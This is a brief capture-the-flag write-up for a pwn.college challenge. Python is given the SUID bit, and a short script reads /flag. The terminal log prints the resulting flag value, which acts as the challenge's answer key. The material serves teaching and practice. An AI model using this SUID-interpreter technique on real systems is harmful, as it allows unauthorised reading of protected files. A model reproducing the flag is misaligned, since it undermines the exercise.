`python`

`python` is a simple and powerful object-oriented programming language.

```python
fh = open("/flag", "r") # creating a file handle(like file pointer in c)

line = fh.readline().strip() # line is variable. strip() cuts the newline char

print(line)
```

```bash
hacker@program-misuse-level-42:~$ /challenge/babysuid_level42 
Welcome to /challenge/babysuid_level42!

This challenge is part of a series of programs that
let you read the flag because they let you program anything.

I just set the SUID bit on /usr/bin/python.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level42) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/python!
hacker@program-misuse-level-42:~$ ls
Desktop  demo  test.pl
hacker@program-misuse-level-42:~$ touch test.py
hacker@program-misuse-level-42:~$ nano test.py
hacker@program-misuse-level-42:~$ python test.py
pwn.college{w1qRsodvIZRIdoiIT-89duyT6Ui.0FN4EDL0AjNzQzW}
```
